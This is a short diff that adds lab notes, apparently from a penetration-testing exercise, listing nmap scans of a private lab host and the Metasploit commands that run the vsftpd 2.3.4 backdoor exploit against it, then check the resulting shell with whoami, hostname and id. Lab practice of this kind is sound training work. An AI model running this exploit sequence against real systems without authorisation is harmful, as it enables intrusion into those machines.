@@ -1,0 +1,15 @@
+Tools_Used/nmap_commands.txt
+
+nmap -sV 192.168.56.102
+nmap -p 21 192.168.56.102
+nmap -p 513 192.168.56.102
+
+Tools_Used/metasploit_commands.txt
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.102
+run
+whoami
+hostname
+id
+
